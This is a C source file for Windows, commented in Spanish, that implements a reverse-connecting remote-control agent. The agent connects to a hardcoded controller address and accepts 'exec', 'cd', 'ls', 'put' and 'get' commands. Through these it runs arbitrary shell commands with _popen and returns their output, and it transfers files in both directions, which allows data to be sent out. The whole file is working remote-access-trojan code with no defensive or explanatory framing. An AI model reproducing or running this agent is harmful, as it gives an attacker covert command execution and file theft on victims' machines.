#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>

#define MAX_COMMAND_SIZE 1024
#define MAX_RESPONSE_SIZE 4096
#define MAX_FILE_NAME 256
#define MAX_BUFFER_SIZE 4096

void showHelp() {
    printf("Comandos disponibles:\n");
    printf("    cd <directorio>          - Cambiar de directorio en el agente\n");
    printf("    pwd                      - Mostrar el directorio actual en el agente\n");
    printf("    ls                       - Listar archivos y directorios en el agente\n");
    printf("    put <archivo_local>      - Subir un archivo al agente\n");
    printf("    get <archivo_remoto>     - Descargar un archivo del agente\n");
    printf("    exec <comando_windows>   - Ejecutar un comando en el agente\n");
    printf("    exit                     - Salir del agente\n");
}

int sendCommand(SOCKET socket, const char* command) {
    if (send(socket, command, strlen(command), 0) < 0) {
        printf("Error al enviar el comando\n");
        return -1;
    }
    return 0;
}

int receiveResponse(SOCKET socket, char* response) {
    memset(response, 0, MAX_RESPONSE_SIZE);
    if (recv(socket, response, MAX_RESPONSE_SIZE - 1, 0) < 0) {
        printf("Error al recibir la respuesta\n");
        return -1;
    }
    return 0;
}

int receiveFile(SOCKET serverSocket, const char* fileName) {
    FILE* file = fopen(fileName, "wb");
    if (file == NULL) {
        printf("Error al crear el archivo %s\n", fileName);
        return -1;
    }

    // Recibir el tamaño del archivo del agente
    long fileSize;
    if (recv(serverSocket, (char*)&fileSize, sizeof(fileSize), 0) < 0) {
        printf("Error al recibir el tamaño del archivo del agente\n");
        fclose(file);
        return -1;
    }

    // Recibir y escribir los datos del archivo en bloques
    char buffer[MAX_BUFFER_SIZE];
    long bytesReceived = 0;
    size_t bytesRead;
    while (bytesReceived < fileSize) {
        int remainingBytes = fileSize - bytesReceived;
        int bytesToReceive = (remainingBytes > MAX_BUFFER_SIZE) ? MAX_BUFFER_SIZE : remainingBytes;
        bytesRead = recv(serverSocket, buffer, bytesToReceive, 0);
        if (bytesRead <= 0) {
            printf("Error al recibir datos del agente\n");
            fclose(file);
            return -1;
        }
        fwrite(buffer, 1, bytesRead, file);
        bytesReceived += bytesRead;
    }

    fclose(file);
    return 0;
}

int sendFile(SOCKET clientSocket, const char* fileName) {
    FILE* file = fopen(fileName, "rb");
    if (file == NULL) {
        printf("Error al abrir el archivo %s\n", fileName);
        return -1;
    }

    // Obtener el tamaño del archivo
    fseek(file, 0, SEEK_END);
    long fileSize = ftell(file);
    fseek(file, 0, SEEK_SET);

    // Enviar el tamaño del archivo al servidor
    if (send(clientSocket, (const char*)&fileSize, sizeof(fileSize), 0) < 0) {
        printf("Error al enviar el tamaño del archivo al servidor\n");
        fclose(file);
        return -1;
    }

    // Enviar el contenido del archivo al servidor en bloques
    char buffer[MAX_BUFFER_SIZE];
    size_t bytesRead;
    while ((bytesRead = fread(buffer, 1, sizeof(buffer), file)) > 0) {
        if (send(clientSocket, buffer, bytesRead, 0) < 0) {
            printf("Error al enviar el archivo al servidor\n");
            fclose(file);
            return -1;
        }
    }

    fclose(file);
    return 0;
}

int executeCommand(const char* command, char* response) {
    FILE* pipe = _popen(command, "r");
    if (pipe == NULL) {
        printf("Error al ejecutar el comando\n");
        return -1;
    }

    // Leer la salida del comando y guardarla en el buffer de respuesta
    memset(response, 0, MAX_RESPONSE_SIZE);
    char buffer[MAX_RESPONSE_SIZE];
    while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
        strcat(response, buffer);
    }

    _pclose(pipe);
    return 0;
}

int main() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("Error al inicializar Winsock\n");
        return 1;
    }

    SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (clientSocket == INVALID_SOCKET) {
        printf("Error al crear el socket del cliente\n");
        WSACleanup();
        return 1;
    }

    const char* serverIP = "192.168.1.47";
    const int serverPort = 12345;

    struct sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(serverPort);
    if (inet_pton(AF_INET, serverIP, &(serverAddr.sin_addr)) <= 0) {
        printf("Dirección IP inválida\n");
        closesocket(clientSocket);
        WSACleanup();
        return 1;
    }

    if (connect(clientSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {
        printf("Error al conectar al servidor\n");
        closesocket(clientSocket);
        WSACleanup();
        return 1;
    }

    char command[MAX_COMMAND_SIZE];
    char response[MAX_RESPONSE_SIZE];

    printf("Agente conectado al servidor\n");
    showHelp();

    while (1) {
        printf("Esperando comando del servidor...\n");

        // Recibir el comando del servidor
        if (receiveResponse(clientSocket, command) != 0) {
            printf("Error al recibir el comando del servidor\n");
            break;
        }

        printf("Comando recibido: %s\n", command);

        // Eliminar el salto de línea final
        command[strcspn(command, "\n")] = '\0';

        // Comprobar el comando recibido
        if (strncmp(command, "cd ", 3) == 0) {
            // Cambiar el directorio en el agente
            char dir[MAX_COMMAND_SIZE];
            sscanf(command, "cd %[^\n]", dir);
            if (SetCurrentDirectory(dir) == 0) {
                printf("Error al cambiar de directorio\n");
            }
        } else if (strcmp(command, "pwd") == 0) {
            // Mostrar el directorio actual en el agente
            char currentDir[MAX_COMMAND_SIZE];
            if (GetCurrentDirectory(MAX_COMMAND_SIZE, currentDir) == 0) {
                printf("Error al obtener el directorio actual\n");
            } else {
                printf("Directorio actual: %s\n", currentDir);
            }
        } else if (strcmp(command, "ls") == 0) {
            // Listar archivos y directorios en el agente
            WIN32_FIND_DATA findData;
            HANDLE hFind = FindFirstFile("*", &findData);
            if (hFind == INVALID_HANDLE_VALUE) {
                printf("Error al listar archivos y directorios\n");
            } else {
                printf("Archivos y directorios:\n");
                do {
                    printf("%s\n", findData.cFileName);
                } while (FindNextFile(hFind, &findData) != 0);
                FindClose(hFind);
            }
        } else if (strncmp(command, "put ", 4) == 0) {
            // Subir un archivo al agente
            char fileName[MAX_FILE_NAME];
            sscanf(command, "put %[^\n]", fileName);
            if (sendFile(clientSocket, fileName) != 0) {
                printf("Error al enviar el archivo al servidor\n");
            } else {
                printf("Archivo enviado al servidor\n");
            }
        } else if (strncmp(command, "get ", 4) == 0) {
            // Descargar un archivo del agente
            char fileName[MAX_FILE_NAME];
            sscanf(command, "get %[^\n]", fileName);
            if (receiveFile(clientSocket, fileName) != 0) {
                printf("Error al recibir el archivo del servidor\n");
            } else {
                printf("Archivo recibido del servidor\n");
            }
        } else if (strncmp(command, "exec ", 5) == 0) {
            // Ejecutar un comando en el agente
            char cmd[MAX_COMMAND_SIZE];
            sscanf(command, "exec %[^\n]", cmd);
            if (executeCommand(cmd, response) != 0) {
                printf("Error al ejecutar el comando\n");
            } else {
                printf("Comando ejecutado correctamente\n");
                printf("Respuesta del comando:\n%s\n", response);
            }
        } else if (strcmp(command, "exit") == 0) {
            // Salir del agente
            printf("Saliendo del agente\n");
            break;
        } else {
            printf("Comando desconocido\n");
        }

        // Enviar la respuesta al servidor
        if (sendCommand(clientSocket, response) != 0) {
            printf("Error al enviar la respuesta al servidor\n");
            break;
        }
    }

    closesocket(clientSocket);
    WSACleanup();
    return 0;
}
